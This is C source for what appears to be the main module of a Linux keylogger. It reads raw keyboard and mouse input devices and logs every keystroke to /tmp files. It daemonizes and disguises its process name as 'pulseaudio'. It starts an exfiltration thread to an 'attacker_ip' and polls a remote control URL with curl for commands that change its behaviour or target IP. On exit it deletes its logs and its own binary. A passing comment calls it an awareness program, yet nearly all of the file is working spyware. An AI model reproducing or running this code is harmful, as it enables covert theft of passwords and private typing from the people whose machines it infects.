#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <pthread.h>
#include <errno.h>
#include "../include/logger.h"
#include "../include/keymap.h"
#include "../include/device_finder.h"
#include "../include/exfiltrator.h"

#define CONTROL_URL_TEMPLATE "http://%s:8080/control"
#define LOG_FILE_PATH "/tmp/keylog.txt"
#define LOG_FILE_TS_PATH "/tmp/keylog_timestamped.txt"
#define DEBUG_LOG_PATH "/tmp/keylogger_debug.log" // ADDED: Path for debug log
// This SELF_PATH is hardcoded; consider making it dynamic or user-configurable
#define SELF_PATH "/home/user/.local/bin/pulseaudio"
#define IP_FILE "server/ip.txt" // This file should not be easily discoverable

volatile int logging_enabled = 1;
volatile int should_exit = 0;
char attacker_ip[128] = "127.0.0.1";

// Track global modifier key states
volatile int shift_pressed = 0;
volatile int capslock_enabled = 0;
volatile int ctrl_pressed = 0; // Declared as volatile at file scope
volatile int alt_pressed = 0;  // Declared as volatile at file scope

void* control_loop(void *arg) {
    while (!should_exit) {
        char control_url[256];
        snprintf(control_url, sizeof(control_url), CONTROL_URL_TEMPLATE, attacker_ip);

        char cmd[300];
        // Note: Using system() with unsanitized input can be dangerous.
        // For an awareness program, this might be illustrative, but be cautious.
        snprintf(cmd, sizeof(cmd), "curl -s \"%s\"", control_url);

        FILE *fp_cmd = popen(cmd, "r");
        if (fp_cmd) {
            char response[128];
            if (fgets(response, sizeof(response), fp_cmd) != NULL) {
                // Strip newline character
                response[strcspn(response, "\n")] = 0;

                if (strcmp(response, "enable") == 0) {
                    logging_enabled = 1;
                } else if (strcmp(response, "disable") == 0) {
                    logging_enabled = 0;
                } else if (strcmp(response, "exit") == 0) {
                    should_exit = 1;
                } else if (strstr(response, "ip:") == response) {
                    strncpy(attacker_ip, response + 3, sizeof(attacker_ip) - 1);
                    attacker_ip[sizeof(attacker_ip) - 1] = '\0';
                    // In a daemonized process, printf won't be seen.
                    // For debugging, you might temporarily redirect stdout/stderr or log to a file.
                }
            }
            pclose(fp_cmd);
        }
        sleep(5); // Check for commands every 5 seconds
    }
    return NULL;
}


int main(int argc, char **argv) {
    // ADDED: Temporarily open a debug log before daemonizing for early prints
    FILE *debug_fp = fopen(DEBUG_LOG_PATH, "a");
    if (!debug_fp) {
        perror("Failed to open debug log");
        return 1;
    }
    fprintf(debug_fp, "Keylogger starting...\n");
    fflush(debug_fp); // Ensure this is written immediately


    // Daemonize the process (fork, setsid, chdir, close std fds)
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        if (debug_fp) fclose(debug_fp); // Close debug log on error
        exit(EXIT_FAILURE);
    }
    if (pid > 0) { // Parent exits
        if (debug_fp) fclose(debug_fp); // Close debug log in parent
        exit(EXIT_SUCCESS);
    }

    // Child continues
    if (setsid() < 0) {
        perror("setsid failed");
        if (debug_fp) fclose(debug_fp); // Close debug log on error
        exit(EXIT_FAILURE);
    }

    close(STDIN_FILENO);
    // IMPORTANT: Redirect stdout and stderr to /dev/null *after* initial setup and debug logging
    // For now, these lines are commented out or moved to allow debug output.
    // freopen("/dev/null", "w", stdout);
    // freopen("/dev/null", "w", stderr);


    // Rename the process to "pulseaudio" for stealth
    // This is a basic attempt at stealth and can be detected by sophisticated tools.
    prctl(PR_SET_NAME, "pulseaudio", 0, 0, 0);
    strcpy(argv[0], "pulseaudio");


    // Initialize logger for plain and timestamped logs
    if (init_logger(LOG_FILE_PATH, LOG_FILE_TS_PATH) != 0) {
        fprintf(debug_fp, "Failed to initialize main logger.\n"); // Log error to debug file
        fflush(debug_fp);
        if (debug_fp) fclose(debug_fp); // Close debug log on error
        return 1;
    }

    // Read attacker IP from file if it exists, otherwise use default
    FILE *ip_fp = fopen(IP_FILE, "r");
    if (ip_fp) {
        if (fgets(attacker_ip, sizeof(attacker_ip), ip_fp) != NULL) {
            attacker_ip[strcspn(attacker_ip, "\n")] = 0; // Strip newline
        }
        fclose(ip_fp);
    } else {
        // If file doesn't exist, create it with default IP
        ip_fp = fopen(IP_FILE, "w");
        if (ip_fp) {
            fprintf(ip_fp, "%s\n", attacker_ip);
            fclose(ip_fp);
        }
    }


    // Start exfiltration thread
    start_exfiltration_thread(attacker_ip);

    // Start control loop thread
    pthread_t control_tid;
    pthread_create(&control_tid, NULL, control_loop, NULL);


    // Dynamically find keyboard and mouse devices
    const char *keyboard_path = find_keyboard_device();
    const char *mouse_path = find_mouse_device();

    // ADDED: Log device paths to debug file
    fprintf(debug_fp, "Keyboard device path: %s\n", keyboard_path ? keyboard_path : "NOT FOUND");
    fprintf(debug_fp, "Mouse device path: %s\n", mouse_path ? mouse_path : "NOT FOUND");
    fflush(debug_fp);


    if (!keyboard_path) {
        fprintf(debug_fp, "Error: Keyboard device not found. Exiting.\n");
        fflush(debug_fp);
        if (debug_fp) fclose(debug_fp);
        return 1;
    }

    int fd_kbd = open(keyboard_path, O_RDONLY);
    if (fd_kbd == -1) {
        fprintf(debug_fp, "Error opening keyboard device %s: %s\n", keyboard_path, strerror(errno));
        fflush(debug_fp);
        if (debug_fp) fclose(debug_fp);
        return 1;
    } else {
        fprintf(debug_fp, "Successfully opened keyboard device: %s\n", keyboard_path);
        fflush(debug_fp);
    }


    int fd_mouse = -1; // Initialize to -1
    if (mouse_path) {
        fd_mouse = open(mouse_path, O_RDONLY);
        if (fd_mouse == -1) {
            fprintf(debug_fp, "Error opening mouse device %s: %s\n", mouse_path, strerror(errno));
            fflush(debug_fp);
            // Continue without mouse logging, as originally intended, but log the error.
        } else {
            fprintf(debug_fp, "Successfully opened mouse device: %s\n", mouse_path);
            fflush(debug_fp);
        }
    }

    // MOVED: Now redirect stdout and stderr to /dev/null after all initial setup/error logging
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
    if (debug_fp) fclose(debug_fp); // Close the debug log after all initial setup/error logging


    struct input_event ie;
    fd_set fds;
    int max_fd = (fd_kbd > fd_mouse) ? fd_kbd : fd_mouse;

    while (!should_exit) {
        FD_ZERO(&fds);
        FD_SET(fd_kbd, &fds);
        if (fd_mouse != -1) {
            FD_SET(fd_mouse, &fds);
        }

        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 }; // 1-second timeout
        int ret = select(max_fd + 1, &fds, NULL, NULL, &tv);

        if (ret == -1) {
            if (errno == EINTR) continue; // Interrupted by signal, just retry
            // Error in select
            break;
        } else if (ret > 0) {
            if (logging_enabled) {
                if (FD_ISSET(fd_kbd, &fds)) {
                    read(fd_kbd, &ie, sizeof(ie));
                    if (ie.type == EV_KEY) {
                        // Handle Key Press Events
                        if (ie.value == 1) { // Key Press
                            if (is_shift_key(ie.code)) {
                                if (!shift_pressed) { // Log only on the first press (prevents duplicates from holds)
                                    log_key("MODIFIER", "<SHIFT_PRESS>");
                                    shift_pressed = 1;
                                }
                            } else if (ie.code == KEY_LEFTCTRL || ie.code == KEY_RIGHTCTRL) {
                                if (!ctrl_pressed) {
                                    log_key("MODIFIER", "<CTRL_PRESS>");
                                    ctrl_pressed = 1;
                                }
                            } else if (ie.code == KEY_LEFTALT || ie.code == KEY_RIGHTALT) {
                                if (!alt_pressed) {
                                    log_key("MODIFIER", "<ALT_PRESS>");
                                    alt_pressed = 1;
                                }
                            } else if (ie.code == KEY_CAPSLOCK) { // No need to check ie.value here, as it's a press event handler
                                capslock_enabled = !capslock_enabled; // Toggle Caps Lock state
                                log_key("MODIFIER", capslock_enabled ? "<CAPSLOCK_ON>" : "<CAPSLOCK_OFF>");
                            } else { // It's a non-modifier key
                                const char *key_str = keycode_to_string(ie.code, shift_pressed, capslock_enabled);
                                if (key_str && strlen(key_str) > 0) {
                                    log_key("KEY", key_str); // Just log the key, modifiers are handled separately
                                } else {
                                    // Log unmapped keys explicitly if key_str is empty/null
                                    char unknown_key[32];
                                    snprintf(unknown_key, sizeof(unknown_key), "<UNKNOWN_KEY_0x%02x>", ie.code);
                                    log_key("KEY", unknown_key);
                                }
                            }
                        }
                        // Handle Key Release Events
                        else if (ie.value == 0) { // Key Release
                            if (is_shift_key(ie.code)) {
                                log_key("MODIFIER", "<SHIFT_RELEASE>");
                                shift_pressed = 0;
                            } else if (ie.code == KEY_LEFTCTRL || ie.code == KEY_RIGHTCTRL) {
                                log_key("MODIFIER", "<CTRL_RELEASE>");
                                ctrl_pressed = 0;
                            } else if (ie.code == KEY_LEFTALT || ie.code == KEY_RIGHTALT) {
                                log_key("MODIFIER", "<ALT_RELEASE>");
                                alt_pressed = 0;
                            }
                            // Caps Lock is a toggle, so its state is not changed on release
                        }
                    }
                }

                if (fd_mouse != -1 && FD_ISSET(fd_mouse, &fds)) {
                    read(fd_mouse, &ie, sizeof(ie));
                    if (ie.type == EV_KEY) {
                        if (ie.code == BTN_LEFT && ie.value == 1)
                            log_key("MOUSE", "[LEFT_CLICK]");
                        else if (ie.code == BTN_RIGHT && ie.value == 1)
                            log_key("MOUSE", "[RIGHT_CLICK]");
                    }
                }
            }
        }
    }

    close(fd_kbd);
    if (fd_mouse != -1) {
        close(fd_mouse);
    }
    close_logger();

    // Clean up logs and self on exit command
    if (should_exit) {
        unlink(LOG_FILE_PATH);
        unlink(LOG_FILE_TS_PATH);
        unlink(IP_FILE); // Also clean up the IP file
        unlink(SELF_PATH); // This will only work if the binary is running from SELF_PATH
    }

    return 0;
}

